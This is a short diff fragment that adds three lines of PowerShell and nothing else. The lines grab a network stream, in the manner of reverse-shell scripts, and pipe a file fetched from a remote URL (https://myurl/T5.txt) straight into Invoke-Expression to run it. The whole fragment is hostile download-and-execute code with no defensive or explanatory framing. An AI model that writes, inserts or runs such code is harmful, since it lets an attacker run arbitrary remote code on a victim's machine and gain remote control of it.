@@ -1,0 +1,3 @@
+$crik = $puter.GetStream();
+$nothing = 0;
+(IWR https://myurl/T5.txt -UseBasicParsing) | IEX;
